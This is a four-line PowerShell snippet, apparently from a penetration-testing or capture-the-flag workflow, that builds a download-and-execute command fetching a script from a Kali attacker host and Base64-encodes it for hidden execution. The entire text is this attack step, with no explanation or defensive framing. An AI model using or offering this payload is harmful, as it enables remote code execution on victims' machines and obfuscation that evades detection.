$payload = "iex((New-Object System.Net.WebClient).DownloadString('http://192.168.KALI.IP/poop.ps1'))"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($payload)
$encodedPayload = [Convert]::ToBase64String($bytes)
Write-Output $encodedPayload
